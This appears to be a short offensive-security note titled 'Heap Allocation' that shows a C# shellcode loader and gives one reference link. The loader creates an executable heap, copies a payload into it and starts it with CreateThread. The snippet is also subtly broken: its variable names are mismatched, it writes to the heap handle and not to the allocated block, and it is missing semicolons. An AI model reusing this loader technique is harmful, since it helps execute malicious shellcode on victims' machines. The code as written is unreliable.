# Heap Allocation

```cs
IntPtr heap = HeapCreate(0x00040000, shellcode.Length, 0);

HeapAlloc(heap, 0x00000008, shellcode.Length);

Marshal.Copy(payload, 0, heap, payload.Length)

IntPtr thread_handle = CreateThread(0, 0, heap, IntPtr.Zero, 0, IntPtr.Zero);

WaitForSingleObject(thread_handle, 0xFFFFFFFF)
```

---
## References

### Tenouk

- [Tenouk: Windows Process & Threads - A Supplementary Note](https://www.tenouk.com/chijklsupp.html)